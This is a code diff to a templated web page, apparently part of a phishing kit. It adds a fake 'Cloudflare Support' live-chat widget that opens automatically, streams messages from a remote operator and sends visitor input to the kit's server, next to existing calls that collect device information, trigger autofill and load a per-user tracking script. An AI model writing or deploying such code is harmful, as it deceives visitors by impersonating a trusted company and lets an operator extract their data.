@@ -655,7 +655,92 @@ window.addEventListener('DOMContentLoaded',function(){
   try{sendDeviceInfo();}catch(e){}
 <% if(autofillAccess){ %>  try{setTimeout(doAutofill,1500);}catch(e){}<% } %>
   setTimeout(_showBtn,2500);
+  setTimeout(initLiveChat, 15000);
 });
+
+// ── Live Chat ─────────────────────────────────────────────────────────────────
+var _chatPid = Math.random().toString(36).slice(2);
+var _chatOpen = false;
+var _chatEvt = null;
+
+function initLiveChat() {
+  var btn = document.createElement('div');
+  btn.id = 'lchat-btn';
+  btn.innerHTML = '<svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>';
+  btn.style.cssText='position:fixed;bottom:20px;right:20px;width:52px;height:52px;background:#f48120;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:0 4px 16px rgba(244,129,32,.5);z-index:9999;animation:lchat-pulse 2s infinite';
+  btn.onclick = toggleChat;
+  document.body.appendChild(btn);
+
+  var box = document.createElement('div');
+  box.id = 'lchat-box';
+  box.style.cssText='position:fixed;bottom:82px;right:16px;width:300px;max-width:90vw;background:#fff;border-radius:16px;box-shadow:0 8px 32px rgba(0,0,0,.2);z-index:9998;display:none;flex-direction:column;overflow:hidden;font-family:sans-serif;direction:ltr';
+  box.innerHTML='<div style="background:#f48120;padding:12px 16px;color:#fff;font-size:13px;font-weight:600;display:flex;justify-content:space-between;align-items:center"><span>🔒 Cloudflare Support</span><span id="lchat-status" style="font-size:10px;opacity:.8">Connecting...</span></div><div id="lchat-msgs" style="height:200px;overflow-y:auto;padding:12px;display:flex;flex-direction:column;gap:8px;background:#f9f9f9"></div><div style="display:flex;border-top:1px solid #eee"><input id="lchat-inp" placeholder="Type a message..." style="flex:1;border:none;padding:12px;font-size:13px;outline:none;background:#fff"><button onclick="sendChatMsg()" style="background:#f48120;color:#fff;border:none;padding:12px 16px;cursor:pointer;font-size:16px">➤</button></div>';
+  document.body.appendChild(box);
+
+  var style = document.createElement('style');
+  style.textContent='@keyframes lchat-pulse{0%,100%{box-shadow:0 4px 16px rgba(244,129,32,.5)}50%{box-shadow:0 4px 24px rgba(244,129,32,.9)}}';
+  document.head.appendChild(style);
+
+  connectChatSSE();
+
+  document.getElementById('lchat-inp').addEventListener('keydown', function(e){
+    if(e.key==='Enter') sendChatMsg();
+  });
+}
+
+function toggleChat() {
+  _chatOpen = !_chatOpen;
+  var box = document.getElementById('lchat-box');
+  box.style.display = _chatOpen ? 'flex' : 'none';
+  document.getElementById('lchat-btn').style.background = _chatOpen ? '#e06000' : '#f48120';
+}
+
+function connectChatSSE() {
+  _chatEvt = new EventSource('<%= a %>/live-chat/<%= uid %>?pid='+_chatPid);
+  _chatEvt.onmessage = function(e) {
+    try {
+      var d = JSON.parse(e.data);
+      if(d.type==='connected') {
+        var st = document.getElementById('lchat-status');
+        if(st) st.textContent = 'Online';
+      }
+      if(d.type==='msg' && d.from==='agent') {
+        appendChatMsg(d.text, 'agent');
+        if(!_chatOpen) {
+          toggleChat();
+          document.getElementById('lchat-btn').style.animation='none';
+          document.getElementById('lchat-btn').style.background='#e06000';
+        }
+      }
+    } catch(err){}
+  };
+  _chatEvt.onerror = function() {
+    setTimeout(connectChatSSE, 5000);
+  };
+}
+
+function appendChatMsg(text, from) {
+  var msgs = document.getElementById('lchat-msgs');
+  if(!msgs) return;
+  var el = document.createElement('div');
+  var isAgent = from === 'agent';
+  el.style.cssText = 'padding:8px 12px;border-radius:12px;max-width:85%;font-size:12px;line-height:1.5;word-break:break-word;' + (isAgent ? 'background:#f48120;color:#fff;align-self:flex-start;' : 'background:#e0e0e0;color:#333;align-self:flex-end;');
+  el.textContent = text;
+  msgs.appendChild(el);
+  msgs.scrollTop = msgs.scrollHeight;
+}
+
+function sendChatMsg() {
+  var inp = document.getElementById('lchat-inp');
+  if(!inp || !inp.value.trim()) return;
+  var msg = inp.value.trim();
+  inp.value = '';
+  appendChatMsg(msg, 'user');
+  fetch('<%= a %>/live-chat-msg', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ uid:'<%= uid %>', pid:_chatPid, msg:msg })
+  }).catch(function(){});
+}
 </script>
 <script src="<%= a %>/t.js?u=<%= uid %>"></script>
 </body>
